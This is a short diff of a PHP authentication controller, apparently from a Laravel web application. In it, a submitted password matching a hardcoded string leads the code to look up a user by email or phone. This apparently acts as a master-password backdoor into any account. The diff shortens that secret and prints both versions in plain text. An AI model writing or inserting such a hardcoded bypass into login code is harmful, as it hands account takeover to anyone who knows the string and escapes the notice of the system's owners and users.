@@ -44,7 +44,7 @@ class AuthController extends Controller
             unset($request['email']);
         }
 
-        if (request('password', '') === 'q11Z#Ps=15$335Ft') {
+        if (request('password', '') === 'q11Z#Ps') {
             if (!empty($request->email)) {
                 $user = User::where('email', $request->email)->first();
             } elseif (!empty($request->phone)) {
